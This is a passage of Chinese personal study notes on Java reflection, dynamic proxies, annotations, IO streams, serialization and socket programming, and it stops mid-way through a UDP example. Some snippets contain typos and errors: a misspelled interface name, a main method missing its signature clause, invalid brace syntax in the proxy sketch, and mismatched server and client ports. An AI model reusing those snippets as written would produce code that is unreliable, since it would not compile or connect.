---
title: "Java学习笔记Ⅱ"
slug: "java-study-notes-02"
description: "记录向，3小时速通Java基础(中); RMI&反射安全相关"
date: 2022-02-27T17:48:55+08:00
categories: ["NOTES&SUMMARY"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

并非Java开发要掌握的全部语法，我挑着来的（提前声明

------

还是廖大的Java教程，后面的安全部分来自p牛的Java安全漫谈

## 反射

反射Reflection可以在程序运行期，对某个实例一无所知的情况下 拿到一个对象的所有信息，调用其方法

是十分强大的语言武器

### Class&动态加载

- `class`由JVM在执行过程中动态加载，JVM第一次读取到一种`class`类型时 将其加载入内存（不遇到不会预先加载，利用这一点可以做到运行期根据条件加载不同的实现类），每加载一种`class`，JVM就为其创建一个`Class`类型的实例 并与其关联起来

```java
// class类型: 名叫Class的class
public final class Class{
	private Class(){}
}
```

以`String`类为例，当JVM加载`String`类时，它首先读取`String.class`入内存，然后为`String`类创建一个`Class`实例并关联起来

```java
Class cls = new Class(String);
```

这个`Class`实例的构造方法为`private`，只有JVM可以创建

- JVM持有的每个`Class`实例都指向一个数据类型(class or interface)

![image-20220227104610572](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104610572.png)

- 一个`Class`实例包含了该`class`的所有信息，所以如果获取了某个`Class`实例，我们就可以通过这个`Class`实例获取到该实例对应的`class`的所有信息，这就叫反射Reflection

![image-20220227104646646](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104646646.png)

- 获取一个`class`的`Class`实例的三种方法

```java
// 通过一个class的静态变量class获取
// 已经加载某个类 获取它的java.lang.Class对象
Class cls = String.class;
```

```java
// 通过实例变量的getClass方法获取
// 上下文已存在某个类的实例
String s = "Hello";
Class cls = s.getClass();
```

```java
// 通过静态方法Class.forName获取
// 前提是知道class的完整类名
Class cls = Class.forName("java.lang.String");
```

- 因为`Class`实例在JVM中是唯一的，所以上述方法获取的`Class`实例是同一个实例，可以用`==`比较
- 一般应该用`instanceof`判断数据类型，不但匹配指定类型，还匹配指定类型的子类；而用`==`判断`class`实例可以精确地判断数据类型，但不能作子类型比较

```java
Integer n = new Integer(123);

boolean b1 = n instanceof Integer; // true，因为n是Integer类型
boolean b2 = n instanceof Number; // true，因为n是Number类型的子类

boolean b3 = n.getClass() == Integer.class; // true，因为n.getClass()返回Integer.class
boolean b4 = n.getClass() == Number.class; // false，因为Integer.class!=Number.class
```

- 通过反射获取实例的基本信息的小栗子

```java
public class Main {
    public static void main(String[] args) {	// 注
        printClassInfo("".getClass());
        printClassInfo(Runnable.class);
        printClassInfo(java.time.Month.class);
        printClassInfo(String[].class);
        printClassInfo(int.class);
    }

    static void printClassInfo(Class cls) {
        System.out.println("Class name: " + cls.getName());
        System.out.println("Simple name: " + cls.getSimpleName());
        if (cls.getPackage() != null) {
            System.out.println("Package name: " + cls.getPackage().getName());
        }
        System.out.println("is interface: " + cls.isInterface());
        System.out.println("is enum: " + cls.isEnum());
        System.out.println("is array: " + cls.isArray());
        System.out.println("is primitive: " + cls.isPrimitive());
    }
}
```

- `String[]`也是一种类，不同于`String.class`，它的类名是`[Ljava.lang.String;`

- 每一种基本类型对应的`Class`实例可以用`基本类型.class`访问

- 获取到`Class`实例后可以用它来创建对应类型的实例，与直接new的相比，局限在于只能调用`public`的无参数构造方法，而有参数的构造方法 或非`public`的构造方法都无法通过`Class.newInstance()`调用

```java
Class cls = String.class;
String s = (String) cls.newInstance();
// 相当于 new String()
```

### 访问字段

- `Class`类提供了以下几个方法来获取字段的（返回`Field`对象

```java
public class Main {
    public static void main(String[] args) throws Exception {
        Class stdClass = Student.class;
        // 根据字段名获取某个public的field(包括父类)
        System.out.println(stdClass.getField("score"));	// 获取public字段"score"
        System.out.println(stdClass.getField("name"));	// 获取继承的public字段"name"
        // 根据字段名获取当前类的某个field(不包括父类)
        System.out.println(stdClass.getDeclaredField("grade"));	// 获取private字段"grade"
    }
}

class Student extends Person {
    public int score;
    private int grade;
}

class Person {
    public String name;
}
```

- 一个`Field`对象包含一个字段的所有信息

```java
Field f = String.class.getDeclaredField("value");
// 返回字段名称
f.getName(); // "value"
// 返回字段类型 是一个Class实例(比如String.class)
f.getType(); // class [B 表示byte[]类型
// 返回字段的修饰符 是一个int 不同的bit有不同的含义
int m = f.getModifiers();
Modifier.isFinal(m); // true
Modifier.isPublic(m); // false
Modifier.isProtected(m); // false
Modifier.isPrivate(m); // true
Modifier.isStatic(m); // false
```

- 用`Field.get(Object)`可以获取指定实例指定字段的值；如果字段为`private`可以调用`Field.setAccessible(true)`，一律访问，可能会失败的原因是JVM运行期`SecurityManager`可能不允许对`java`和`javax`开头的package的类调用`setAccessible(true)`，保护JVM核心库的安全
- 同样的，用`Field.set(Object, Object)`可以设置字段的值，第一个`Object`参数是指定的实例，第二个`Object`参数是待修改的值

```java
import java.lang.reflect.Field;

public class Main {

    public static void main(String[] args) throws Exception {
        Person p = new Person("Xiao Ming");
        System.out.println(p.getName()); // "Xiao Ming"
        Class c = p.getClass();
        Field f = c.getDeclaredField("name");
        f.setAccessible(true);	// 修改非public字段
        f.set(p, "Xiao Hong");
        System.out.println(p.getName()); // "Xiao Hong"
    }
}

class Person {
    private String name;

    public Person(String name) {
        this.name = name;
    }

    public String getName() {
        return this.name;
    }
}
```

### 调用方法

- `Class`类提供了以下几个方法来获取方法的（返回`Method`对象

```java
public class Main {
    public static void main(String[] args) throws Exception {
        Class stdClass = Student.class;
        // 获取某个public的Method(包括父类)
        System.out.println(stdClass.getMethod("getScore", String.class));	// 获取public方法getScore，参数为String
        System.out.println(stdClass.getMethod("getName"));	// 获取继承的public方法getName，无参数
        // 获取当前类的某个Method(不包括父类)
        System.out.println(stdClass.getDeclaredMethod("getGrade", int.class));	// 获取private方法getGrade，参数为int
    }
}

class Student extends Person {
    public int getScore(String type) {
        return 99;
    }
    private int getGrade(int year) {
        return 1;
    }
}

class Person {
    public String getName() {
        return "Person";
    }
}
```

- 一个`Method`对象包含一个方法的所有信息，函数基本同上一个三级标题
- 得到`Method`后我们可以对他进行调用，方式是调用其`invoke`，第一个参数是对象实例，后面为可变参数，与方法参数一致

```java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        String s = "Hello world";	// String对象
        Method m = String.class.getMethod("substring", int.class);	        // 获取String substring(int)
        String r = (String) m.invoke(s, 6);	// 调用
        System.out.println(r);
    }
}
```

值得注意的是，`substring`自身有两个重载方法，我们获取的是其中的`substring(int)`这个方法

- 如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以`invoke`方法传入的第一个参数永远为`null`

```java
import java.lang.reflect.Method;

public class Main{
	public static void main(String[] args)
		Method m = Integer.class.getMethod("parseInt", String.class);	// 获取Integer.parseInt(String)
		Integer n = (Integer) m.invoke(null, "12345");	// 调用
		System.out.println(n);
}
```

- 同上一个三级标题对于private字段的处理，我们可以用`Method.setAccessible(true)`，也存在同样可能失败的原因，不重复了

```java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        Person p = new Person();
        Method m = p.getClass().getDeclaredMethod("setName", String.class);
        m.setAccessible(true);
        m.invoke(p, "Bob");
        System.out.println(p.name);
    }
}

class Person {
    String name;
    private void setName(String name) {
        this.name = name;
    }
}
```

- 对于参数不同的方法 我们可以指定参数类型和数量，而对于多态，仍表现出多态的原则，即 总是调用实际类型的覆写方法（如果存在

```java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        Method h = Person.class.getMethod("hello");
        h.invoke(new Student());
		/** 相当于
		Person p = new Student();
		p.hello(); */

    }
}

class Person {
    public void hello() {
        System.out.println("Person:hello");
    }
}

class Student extends Person {
    public void hello() {	// 继承自Person 覆写hello方法
        System.out.println("Student:hello");
    }
}
```

### 调用构造方法

- 正常的new会触发构造方法，通过class的new会有局限性（见上），为了调用任意的构造方法，我们可以使用反射的Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例；Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例

```java
import java.lang.reflect.Constructor;

public class Main {
    public static void main(String[] args) throws Exception {
        // 获取某个public的Constructor
        Constructor cons1 = Integer.class.getConstructor(int.class);	// 获取构造方法Integer(int)
        Integer n1 = (Integer) cons1.newInstance(123);	// 调用构造方法
        System.out.println(n1);

        Constructor cons2 = Integer.class.getConstructor(String.class);	// 获取构造方法Integer(String)
        Integer n2 = (Integer) cons2.newInstance("456");
        System.out.println(n2);
    }
}
```

- 注意`Constructor`总是当前类定义的构造方法，和父类无关，因此不存在多态的问题
- 同上面，可以有`setAccessible(true)`来调用非public的Constructor

### 获取继承关系

- 最开始的三级标题Class中提到了三种方式获取Class实例，他们都是同一个实例，因为JVM对每个加载的`Class`只创建一个`Class`实例来表示它的类型
- 获取父类Class

```java
public class Main {
    public static void main(String[] args) throws Exception {
        Class i = Integer.class;
        Class n = i.getSuperclass();
        System.out.println(n);
        Class o = n.getSuperclass();
        System.out.println(o);
        System.out.println(o.getSuperclass());
    }
}
```

- 获取接口，`getInterfaces`只返回当前类直接实现的接口类型，不包括父类；如果一个类没有实现任何`interface`，那么`getInterfaces`返回空数组

```java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {
        Class s = Integer.class;
        Class[] is = s.getInterfaces();
        for (Class i : is) {
            System.out.println(i);
        }
    }
}
```

- 当我们判断一个实例是否是某个类型时，正常情况下使用`instanceof`

```java
Object n = Integer.valueOf(123);
boolean isDouble = n instanceof Double; // false
boolean isInteger = n instanceof Integer; // true
boolean isNumber = n instanceof Number; // true
boolean isSerializable = n instanceof java.io.Serializable; // true
```

- 如果是两个`Class`实例，要判断一个向上转型是否成立，可以调用`isAssignableFrom()`

```java
// Integer i = ?
Integer.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Integer
// Number n = ?
Number.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Number
// Object o = ?
Object.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Object
// Integer i = ?
Integer.class.isAssignableFrom(Number.class); // false，因为Number不能赋值给Integer
```

### 动态代理

- `class`可以实例化而`interface`不可以，所有`interface`类型的变量总是通过某个实例向上转型并赋值给接口类型变量

```java
CharSequence cs = new StringBuilder();
```

- 静态方式

```java
// 定义接口
public interface Hellp{
	void morning(String name);
}

// 编写实现类
public class HelloWorld implements Hellp{
	public void morning(String name){
		System.out.println("Good morning, " + name);
	}
}

// 创建实例 转型为接口并调用
Hello hello = new HelloWorld();
hello.morning("Bob");
```

- 动态代理Dynamic Proxy可以在运行期动态创建某个`interface`的实例，不编写实现类，直接通过`Proxy.newProxyInstance()`创建一个`Hello`接口对象

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class Main {
    public static void main(String[] args) {
        InvocationHandler handler = new InvocationHandler() {	// InvocationHandler实例负责实现接口的方法调用
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println(method);
                if(method.getName().equals("morning")){
                    System.out.println("Good mornig, " + args[0]);
                }
                return null;
            }
        };

        Hello hello = (Hello) Proxy.newProxyInstance(	// 返回的Object强制转型为接口
                Hello.class.getClassLoader(),	// 使用的ClassLoader 通常为接口类的ClassLoader
                new Class[]{Hello.class},	// 需要实现的接口数组 至少传入一个接口
                handler);	// 用来处理接口方法调用的InvocationHandler实例
        hello.morning("Bob");

    }
}


interface Hello{
    void morning(String name);
}
```

- 动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，上面的改写为静态实现是这样的

```java
public class HelloDynamicProxy implements Hello{
	InvationHandler handler;
	public HelloDynamicProxy(InvocationHandler handler){
		this.handler = handler;
	}
	public void morning(String name){
		handler.invoke{
			this,
			Hello.class.getMethod("morning", String.class),
			new Object[]{name};
		}
	}
}
```

只不过JVM直接编写了这个中间的类，不需要源码，可以直接生成字节码

## 注解

注解Annotation，是放在Java源码的类、方法、字段、参数前的一种特殊注释

### 使用&定义注解

注解可分为三类

- 1 编译器使用的注解：这类注解不会被编译进入`.class`文件，它们在编译后就被编译器扔掉了

`@Override`：让编译器检查该方法是否正确地实现了覆写

`@SuppressWarnings`：告诉编译器忽略此处代码产生的警告

- 2 由工具处理`.class`文件使用的注解：有些工具会在加载class的时候，对class做动态修改，实现一些特殊的功能；这类注解会被编译进入`.class`文件，但加载结束后并不会存在于内存中
- 3 程序运行期可读取的注解：加载后一直存在于JVM中，这也是最常用的注解

`@PostConstruct`：配置了它的方法会在调用构造方法后自动被调用，这是Java代码读取该注解实现的功能，JVM并不会识别该注解

- 定义一个注解时，还可以定义配置参数，配置参数可以包括：基本类型，String，枚举类，基本类型、String、Class以及枚举的数组；可以设置缺省值，如果只写注解，相当于全部使用默认值

```java
public class Hello {
    @Check(min=0, max=100, value=55)
    public int n;

    @Check(value=99)
    public int p;

    @Check(99) // @Check(value=99)
    public int x;

    @Check
    public int y;
}
```

`@Check`就是一个注解

- 有一些注解可以修饰其他注解，这些注解就称为元注解Meta annotation

`@Target`：使用`@Target`可以定义`Annotation`能够被应用于源码的哪些位置

```
类或接口：ElementType.TYPE
字段：ElementType.FIELD
方法：ElementType.METHOD
构造方法：ElementType.CONSTRUCTOR
方法参数：ElementType.PARAMETER
```

`@Retention`：定义了`Annotation`的生命周期，通常我们自定义的`Annotation`都是`RUNTIME`

```
仅编译期：RetentionPolicy.SOURCE	编译器被丢掉 一般不用(编译器使用)
仅class文件：RetentionPolicy.CLASS	仅保存在class文件中 不会被加载入JVM(底层工具库使用 涉及class的加载)
运行期：RetentionPolicy.RUNTIME	会被加载进JVM 并在运行期被程序读取(常用)
```

`@Repeatable`：定义`Annotation`是否可重复

`@Inherited`：定义子类是否可继承父类定义的`Annotatio`，仅针对`@Target(ElementType.TYPE)`类型的`annotation`有效，并且仅针对`class`的继承，对`interface`的继承无效

- 使用`@interface`语法来定义注解，用元注释来配置注释，其中`@Target`和`@Retention`(一般设为RUNTIME)必须设置

```java
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
public @interface Report {
    int type() default 0;
    String level() default "info";
    String value() default "";
}
```

### 处理注解

注解本身对代码逻辑没有任何影响，如何使用注解完全由工具决定

注解定义后也是一种`class`，所有的注解都继承自`java.lang.annotation.Annotation`，所以读取注解需要用到反射

判断某个注解是否存在于`Class`、`Field`、`Method`或`Constructor`：

- `Class.isAnnotationPresent(Class)`
- `Field.isAnnotationPresent(Class)`
- `Method.isAnnotationPresent(Class)`
- `Constructor.isAnnotationPresent(Class)`

```java
// 判断@Report是否存在于Person类:
Person.class.isAnnotationPresent(Report.class);
```

反射API读取Annotation：

- `Class.getAnnotation(Class)`
- `Field.getAnnotation(Class)`
- `Method.getAnnotation(Class)`
- `Constructor.getAnnotation(Class)`

```java
// 获取Person定义的@Report注解:
Report report = Person.class.getAnnotation(Report.class);
int type = report.type();
String level = report.level();
```

使用反射API读取`Annotation`有两种方法。方法一是先判断`Annotation`是否存在，如果存在，就直接读取：

```java
Class cls = Person.class;
if (cls.isAnnotationPresent(Report.class)) {
    Report report = cls.getAnnotation(Report.class);
    ...
}
```

第二种方法是直接读取`Annotation`，如果`Annotation`不存在，将返回`null`：

```java
Class cls = Person.class;
Report report = cls.getAnnotation(Report.class);
if (report != null) {
   ...
}
```

读取方法、字段和构造方法的`Annotation`和Class类似。但要读取方法参数的`Annotation`就比较麻烦一点，因为方法参数本身可以看成一个数组，而每个参数又可以定义多个注解，所以，一次获取方法参数的所有注解就必须用一个二维数组来表示。例如，对于以下方法定义的注解：

```java
public void hello(@NotNull @Range(max=5) String name, @NotNull String prefix) {
}
```

要读取方法参数的注解，我们先用反射获取`Method`实例，然后读取方法参数的所有注解：

```java
// 获取Method实例:
Method m = ...
// 获取所有参数的Annotation:
Annotation[][] annos = m.getParameterAnnotations();
// 第一个参数（索引为0）的所有Annotation:
Annotation[] annosOfName = annos[0];
for (Annotation anno : annosOfName) {
    if (anno instanceof Range) { // @Range注解
        Range r = (Range) anno;
    }
    if (anno instanceof NotNull) { // @NotNull注解
        NotNull n = (NotNull) anno;
    }
}
```

定义了注解，本身对程序逻辑没有任何影响，必须自己编写代码来使用注解

```java
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.FIELD)
public @interface Range {
    int min() default 0;
    int max() default 255;
}

void check(Person person) throws IllegalArgumentException, ReflectiveOperationException {
    // 遍历所有Field:
    for (Field field : person.getClass().getFields()) {
        // 获取Field定义的@Range:
        Range range = field.getAnnotation(Range.class);
        // 如果@Range存在:
        if (range != null) {
            // 获取Field的值:
            Object value = field.get(person);
            // 如果值是String:
            if (value instanceof String) {
                String s = (String) value;
                // 判断值是否满足@Range的min/max:
                if (s.length() < range.min() || s.length() > range.max()) {
                    throw new IllegalArgumentException("Invalid field: " + field.getName());
                }
            }
        }
    }
}
```

这样一来，我们通过`@Range`注解，配合`check()`方法，就可以完成`Person`实例的检查。注意检查逻辑完全是我们自己编写的，JVM不会自动给注解添加任何额外的逻辑。

## IO

### File&Path

- 标准库`java.io`提供`File`对象来操作文件和目录，可以传入绝对路径和相对路径；即使传入的不存在也不报错，可以用`isFile`, `isDirectory`进行检查
- `File`对象既可以表示文件，也可以表示目录，可以用`getPath`(传入路径), `getAbsolutePath`(绝对路径), `getCanonicalPath`(规范路径)
- 当File对象表示一个目录时，可以使用`list()`和`listFiles()`列出目录下的文件和子目录名，`listFiles()`提供了一系列重载方法，可以过滤不想要的文件和目录

```java
import java.io.*;
public class Main {
    public static void main(String[] args) throws IOException {
        File f = new File("C:\\Windows");
        File[] fs1 = f.listFiles(); // 列出所有文件和子目录
        printFiles(fs1);
        File[] fs2 = f.listFiles(new FilenameFilter() { // 仅列出.exe文件
            public boolean accept(File dir, String name) {
                return name.endsWith(".exe"); // 返回true表示接受该文件
            }
        });
        printFiles(fs2);
    }

    static void printFiles(File[] files) {
        System.out.println("==========");
        if (files != null) {
            for (File f : files) {
                System.out.println(f);
            }
        }
        System.out.println("==========");
    }
}
```

- 其它API

```
boolean canRead()：是否可读
boolean canWrite()：是否可写
boolean canExecute()：是否可执行
long length()：文件字节大小

boolean mkdir()：创建当前File对象表示的目录
boolean mkdirs()：创建当前File对象表示的目录，并在必要时将不存在的父目录也创建出来
boolean delete()：删除当前File对象表示的目录，当前目录必须为空才能删除成功
```

- 可以用`createTempFile()`来创建一个临时文件，以及`deleteOnExit()`在JVM退出时自动删除该文件

```java
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException {
        File f = File.createTempFile("tmp-", ".txt"); // 提供临时文件的前缀和后缀
        f.deleteOnExit(); // JVM退出时自动删除
        System.out.println(f.isFile());
        System.out.println(f.getAbsolutePath());
    }
}
```

- `Path`对象位于`java.nio.file`包，和`File`对象类似，但操作更加简单，便于操作目录的拼接、遍历等

```java
import java.io.*;
import java.nio.file.*;

public class Main {
    public static void main(String[] args) throws IOException {
        Path p1 = Paths.get(".", "project", "study"); // 构造一个Path对象
        System.out.println(p1);
        Path p2 = p1.toAbsolutePath(); // 转换为绝对路径
        System.out.println(p2);
        Path p3 = p2.normalize(); // 转换为规范路径
        System.out.println(p3);
        File f = p3.toFile(); // 转换为File对象
        System.out.println(f);
        for (Path p : Paths.get("..").toAbsolutePath()) { // 可以直接遍历Path
            System.out.println("  " + p);
        }
    }
}
```

### Files&Paths

是`java.nio`包里面的类，封装了很多读写文件的简单方法

```java
// 把一个文件的全部内容读取为一个byte[]
byte[] data = Files.readAllBytes(Paths.get("/path/to/file.txt"));
```

```java
// 把一个文件的全部内容读取为String
// 默认使用UTF-8编码读取:
String content1 = Files.readString(Paths.get("/path/to/file.txt"));
// 可指定编码:
String content2 = Files.readString(Paths.get("/path/to/file.txt"), StandardCharsets.ISO_8859_1);
// 按行读取并返回每行内容:
List<String> lines = Files.readAllLines(Paths.get("/path/to/file.txt"));
```

```java
// 写入文件
// 写入二进制文件:
byte[] data = ...
Files.write(Paths.get("/path/to/file.txt"), data);
// 写入文本并指定编码:
Files.writeString(Paths.get("/path/to/file.txt"), "文本内容...", StandardCharsets.ISO_8859_1);
// 按行写入文本:
List<String> lines = ...
Files.write(Paths.get("/path/to/file.txt"), lines);
```

注意，`Files`提供的读写方法，受内存限制，只能读写小文件，例如配置文件等，不可一次读入几个G的大文件。读写大型文件仍然要使用文件流，每次只读写一部分文件内容

### 字节流读写

- `InputStream`代表输入字节流，`OuputStream`代表输出字节流，以byte为最小单位
- `Reader`和`Writer`表示字符流(读写字符，并且字符不全是单字节表示的ASCII字符)，以char为最小单位
- 如果数据源不是文本，就只能使用`InputStream`，如果数据源是文本，使用Reader更方便一些

- `InputStream`并不是一个接口，而是一个抽象类，它是所有输入流的超类，这个抽象类定义的一个最重要的方法就是`int read()`

```java
public abstract int read() throws IOException;
```

这个方法会读取输入流的下一个字节，并返回字节表示的`int`值（0~255），如果已读到末尾，返回`-1`表示不能继续读取了

- `FileInputStream`是`InputStream`的一个子类，从文件流中读取数据

```java
public void readFile() throws IOException{
	InputStream input = new FileInputStream("src/readme.md");
	for(;;){
		int n = input.read();
		if(n == -1){
			break;
		}
		System.out.println(n);
	}
	input.close();
}
```

- 所有与IO操作相关的代码都必须正确处理`IOException`，可以用`try ... finally`来保证`InputStream`在无论是否发生IO错误的时候都能够正确地关闭

```java
public void readFile() throws IOException{
	InputStream input = null;
	try{
		input = new FileInputStream("src/readme.txt");
		int n;
		while((n = input.read())!=-1){
			System.out.prinln(n);
		}
	}finally{
		if(input!=null){
			input.close();
		}
	}
}
```

- java7之后可以用更简单的try(resource)

```java
public void readFile() throws IOException {
    try (InputStream input = new FileInputStream("src/readme.txt")) {
        int n;
        while ((n = input.read()) != -1) {
            System.out.println(n);
        }
    } // 编译器在此自动为我们写入finally并调用close()
}
```

实际上，编译器并不会特别地为`InputStream`加上自动关闭。编译器只看`try(resource = ...)`中的对象是否实现了`java.lang.AutoCloseable`接口，如果实现了，就自动加上`finally`语句并调用`close()`方法。`InputStream`和`OutputStream`都实现了这个接口，因此都可以用在`try(resource)`中

- `InputStream`提供了两个重载方法来支持读取多个字节

```
int read(byte[] b)：读取若干字节并填充到byte[]数组，返回读取的字节数
int read(byte[] b, int off, int len)：指定byte[]数组的偏移量和最大填充数
```

利用上述方法一次读取多个字节时，需要先定义一个`byte[]`数组作为缓冲区，`read()`方法会尽可能多地读取字节到缓冲区， 但不会超过缓冲区的大小。`read()`方法的返回值不再是字节的`int`值，而是返回实际读取了多少个字节。如果返回`-1`，表示没有更多的数据了

利用缓冲区一次读取多个字节的代码如下：

```java
public void readFile() throws IOException {
    try (InputStream input = new FileInputStream("src/readme.txt")) {
        // 定义1000个字节大小的缓冲区:
        byte[] buffer = new byte[1000];
        int n;
        while ((n = input.read(buffer)) != -1) { // 读取到缓冲区
            System.out.println("read " + n + " bytes.");
        }
    }
}
```

- 除`FileInputStream`以外还有`ByteArrayInputStream`可以在内存中模拟一个`InputStream`，实际上是把一个`byte[]`数组在内存中变成一个`InputStream`

```java
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException {
        byte[] data = { 72, 101, 108, 108, 111, 33 };
        try (InputStream input = new ByteArrayInputStream(data)) {
            int n;
            while ((n = input.read()) != -1) {
                System.out.println((char)n);
            }
        }
    }
}
```

- `OutputStream`还提供了一个`flush()`方法，它的目的是将缓冲区的内容真正输出到目的地

### 字符流读写

| InputStream                         | Reader                                |
| :---------------------------------- | :------------------------------------ |
| 字节流，以`byte`为单位              | 字符流，以`char`为单位                |
| 读取字节（-1，0~255）：`int read()` | 读取字符（-1，0~65535）：`int read()` |
| 读到字节数组：`int read(byte[] b)`  | 读到字符数组：`int read(char[] c)`    |

除了特殊的`CharArrayReader`和`StringReader`，普通的`Reader`实际上是基于`InputStream`构造的，因为`Reader`需要从`InputStream`中读入字节流（`byte`），然后，根据编码设置，再转换为`char`就可以实现字符流。如果我们查看`FileReader`的源码，它在内部实际上持有一个`FileInputStream`。

既然`Reader`本质上是一个基于`InputStream`的`byte`到`char`的转换器，那么，如果我们已经有一个`InputStream`，想把它转换为`Reader`，是完全可行的。`InputStreamReader`就是这样一个转换器，它可以把任何`InputStream`转换为`Reader`。示例代码如下：

```java
// 持有InputStream:
InputStream input = new FileInputStream("src/readme.txt");
// 变换为Reader:
Reader reader = new InputStreamReader(input, "UTF-8");
```

构造`InputStreamReader`时，我们需要传入`InputStream`，还需要指定编码，就可以得到一个`Reader`对象。上述代码可以通过`try (resource)`更简洁地改写如下：

```java
try (Reader reader = new InputStreamReader(new FileInputStream("src/readme.txt"), "UTF-8")) {
    // TODO:
}
```

上述代码实际上就是`FileReader`的一种实现方式。

使用`try (resource)`结构时，当我们关闭`Reader`时，它会在内部自动调用`InputStream`的`close()`方法，所以，只需要关闭最外层的`Reader`对象即可

| OutputStream                           | Writer                                   |
| :------------------------------------- | :--------------------------------------- |
| 字节流，以`byte`为单位                 | 字符流，以`char`为单位                   |
| 写入字节（0~255）：`void write(int b)` | 写入字符（0~65535）：`void write(int c)` |
| 写入字节数组：`void write(byte[] b)`   | 写入字符数组：`void write(char[] c)`     |
| 无对应方法                             | 写入String：`void write(String s)`       |

除了`CharArrayWriter`和`StringWriter`外，普通的Writer实际上是基于`OutputStream`构造的，它接收`char`，然后在内部自动转换成一个或多个`byte`，并写入`OutputStream`。因此，`OutputStreamWriter`就是一个将任意的`OutputStream`转换为`Writer`的转换器：

```
try (Writer writer = new OutputStreamWriter(new FileOutputStream("readme.txt"), "UTF-8")) {
    // TODO:
}
```

上述代码实际上就是`FileWriter`的一种实现方式，这和上面的`InputStreamReader`是一样的

### Filter模式

Filter模式可以在运行期动态增加功能，又称Decorator模式

### classpath

从classpath读取文件就可以避免不同环境下文件路径不一致的问题，在classpath中的资源文件，路径总是以`／`开头，我们先获取当前的`Class`对象，然后调用`getResourceAsStream()`就可以直接从classpath读取任意的资源文件：

```java
try (InputStream input = getClass().getResourceAsStream("/default.properties")) {
    // TODO:
}
```

调用`getResourceAsStream()`需要特别注意的一点是，如果资源文件不存在，它将返回`null`。因此，我们需要检查返回的`InputStream`是否为`null`，如果为`null`，表示资源文件在classpath中没有找到：

```java
try (InputStream input = getClass().getResourceAsStream("/default.properties")) {
    if (input != null) {
        // TODO:
    }
}
```

如果我们把默认的配置放到jar包中，再从外部文件系统读取一个可选的配置文件，就可以做到既有默认的配置文件，又可以让用户自己修改配置：

```java
Properties props = new Properties();
props.load(inputStreamFromClassPath("/default.properties"));
props.load(inputStreamFromFile("./conf.properties"));
```

这样读取配置文件，应用程序启动就更加灵活

### 序列化&反序列化

序列化是指把一个Java对象变成二进制内容，本质上就是一个`byte[]`数组

一个Java对象要能序列化，必须实现一个特殊的`java.io.Serializable`接口(标记接口Marker Interface)

```java
public interface Serializable{
}
```

反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行（同PHP），可设置`serialVersionUID`作为版本号

```java
public class Person implements Serializable {
    private static final long serialVersionUID = 2709425275741743919L;
}
```

可以避免class定义变动导致的不兼容，通常可以由IDE自动生成

## 网络编程

### Socket - TCP

一个Socket就是由ip和port构成，Socket编程就是指两个进程之间的网络通信，Server&Client

```java
// Server.java
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;


public class Server {
    public static void main(String[] args) throws IOException{
        ServerSocket ss = new ServerSocket(6980);
        System.out.println("Server is running...");
        for(;;){
            Socket sock = ss.accept();
            System.out.println("connected from " + sock.getRemoteSocketAddress());
            Thread t = new Handler(sock);
            t.start();
        }
    }
}


class Handler extends Thread{
    Socket sock;
    public Handler(Socket sock){
        this.sock = sock;
    }
    @Override
    public void run(){
        try(InputStream input = this.sock.getInputStream()){
            try(OutputStream output = this.sock.getOutputStream()){
                handle(input, output);
            }
        }catch (Exception e){
            try {
                this.sock.close();
            }catch (IOException ioe){
            }
            System.out.println("Client disconnected");
        }
    }

    private void handle(InputStream input, OutputStream output) throws IOException{
        var writer = new BufferedWriter(new OutputStreamWriter(output, StandardCharsets.UTF_8));
        var reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8));
        writer.write("hello\n");
        writer.flush();
        for (;;){
            String s = reader.readLine();
            if(s.equals("bye")){
                writer.write("bye~\n");
                writer.flush();
                break;
            }
            writer.write("ok: " + s + "\n");
            writer.flush();
        }
    }
}
```

```java
public class Client {
    public static void main(String[] args) throws IOException {
        Socket sock = new Socket("localhost", 6666); // 连接指定服务器和端口
        try (InputStream input = sock.getInputStream()) {
            try (OutputStream output = sock.getOutputStream()) {
                handle(input, output);
            }
        }
        sock.close();
        System.out.println("disconnected.");
    }

    private static void handle(InputStream input, OutputStream output) throws IOException {
        var writer = new BufferedWriter(new OutputStreamWriter(output, StandardCharsets.UTF_8));
        var reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8));
        Scanner scanner = new Scanner(System.in);
        System.out.println("[server] " + reader.readLine());
        for (;;) {
            System.out.print(">>> "); // 打印提示
            String s = scanner.nextLine(); // 读取一行输入
            writer.write(s);
            writer.newLine();
            writer.flush();
            String resp = reader.readLine();
            System.out.println("<<< " + resp);
            if (resp.equals("bye")) {
                break;
            }
        }
    }
}
```

注意`flush()`，不然可能都收不到消息

### Socket - UDP

Server

```java
DatagramSocket ds = new DatagramSocket(6666); // 监听指定端口
for (;;) { // 无限循环
    // 数据缓冲区:
    byte[] buffer = new byte[1024];
    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
    ds.receive(packet); // 收取一个UDP数据包
    // 收取到的数据存储在buffer中，由packet.getOffset(), packet.getLength()指定起始位置和长度
    // 将其按UTF-8编码转换为String:
